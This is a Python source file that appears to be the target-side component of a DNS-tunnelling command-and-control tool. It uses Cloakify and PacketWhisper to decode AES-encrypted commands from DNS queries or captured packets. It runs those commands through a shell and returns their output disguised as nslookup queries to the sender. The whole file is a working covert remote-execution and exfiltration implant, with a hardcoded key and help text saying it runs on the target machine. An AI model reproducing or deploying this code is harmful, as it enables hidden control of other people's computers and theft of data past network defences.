import subprocess
import os
import argparse
import time
from dns_server import start_udp_server
import requests
from aes_encrypt import decrypt_message, encrypt_message
from cloakify import Cloakify
from decloakify import Decloakify
from pcapCapture import *
from packetWhisper import TransferCloakedFile, ExtractDNSQueriesFromPCAP, ExtractPayloadFromDNSQueries
import signal



def clear_files_on_exit(signum, frame):
    open('cloaked.payload', 'w').close()
    open('cloaked_response.txt', 'w').close()
    print("Files cleared on exit.")
    exit(0)

signal.signal(signal.SIGINT, clear_files_on_exit)

# AES Key
key = b'VijMwRNSQHALXQodmjCdH4UB7SCw/+EpnuBXfko7ReyqG3oYAky0eYxxx92xi49q'[:32]
cipher = "ciphers\\common_fqdn\\topWebsites"
dns = '127.0.0.1'

def receive_command(local=False):
    srcIp = os.environ.get('SRC_IP')
    cloakedFile = "cloaked.payload"
    
    if local:
        print("Capturing pcap...")
        subprocess.call(['python', 'pcapCapture.py']) 
        print("pcap collected...")
        dnsQueriesFilename = ExtractDNSQueriesFromPCAP("cloaked_command.pcap", osStr="Windows")
        cloakedFile, srcIp = ExtractPayloadFromDNSQueries(dnsQueriesFilename, cipher, "www", isRandomized=True)
        
        # Check if cloakedFile exists after extraction
        if os.path.exists(cloakedFile):
            print(f"{cloakedFile} exists after extraction.")
        else:
            print(f"{cloakedFile} does not exist after extraction.")

    cloaked_command = cloakedFile 
    decloaked_command = "decloaked_command.txt"
    
    if os.environ.get('EOT') == 'True' or local:
        with open(cloaked_command, 'r') as file:
            if file.read().strip() == "":
                print("No command received.")
                return
        
        # Decloakify the command
        print("Decloakifying...")
        if Decloakify(cloaked_command, cipher, decloaked_command) == -1:
            print("Requesting re-trasmission")
            send_response('rt', srcIp)
            receive_command()

        # Check if cloakedFile exists after decloakifying
        if os.path.exists(cloaked_command):
            print(f"{cloaked_command} exists after decloakifying.")
        else:
            print(f"{cloaked_command} does not exist after decloakifying.")

        # Decrypt the command
        with open(decloaked_command, 'r') as file:
            encrypted_command = file.read().strip()
        command = decrypt_message(encrypted_command, key)
        if (command == 'rt'):
            send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp)
        print('received command: '+ command)
        
        # Execute the command
        try:
            # Send response of the execution
            time.sleep(1)
            send_response(subprocess.check_output(command, shell=True).decode('utf-8'), srcIp)

        except Exception as e:
            print(f"Unrecognized command: {e}")
            time.sleep(1)
            send_response(f"Unrecognized command: {e}")

    # Removes useless files (after execution)
    os.remove(cloaked_command)
    os.remove(decloaked_command)
    start_udp_server()

def send_response(response, dns='127.0.0.1'):
    print('Sender IP:', dns)
    # Encrypt the response
    encrypted_response = encrypt_message(response, key)

    # Cloakify the response
    cloaked_response = "cloaked_response.txt"
    
    Cloakify(encrypted_response, cipher, cloaked_response)
    
    
    TransferCloakedFile("cloaked_response.txt", 0.0, dns)
    # Send response using dns requests
    with open(cloaked_response, 'r') as file:
        for fqdn in file:
            fqdn_str = fqdn.strip()
            subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    
    # Remove response file
    os.remove(cloaked_response)



if __name__ == "__main__":
    ip = requests.get('https://ipinfo.io/ip')
    parser = argparse.ArgumentParser(
        description=f"This script must run on the target machine.\n\n1) Make sure that UDP port 53 is open on both Sender and Receiver. \n2) Run this script with the --run parameter. \n3) Run 'python sender.py -d {ip.text}' on the sender script.",
        formatter_class=argparse.RawTextHelpFormatter 
    )
    parser.add_argument('--run', action='store_true', help="Run the server if specified")    
    parser.add_argument('--local', action='store_true', help="If both sender and receiver are on the same LAN, use this flag to capture the pcap locally.")    
    subprocess.Popen(['python', 'dns_server.py'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    args = parser.parse_args()
    if args.run:
        print("Running and waiting for requests...")
        while True:
            try:
                receive_command(args.local) 
            except Exception as e:
                print(f'Something wrong happend during the connection: {e}')
    else:
        parser.print_help()
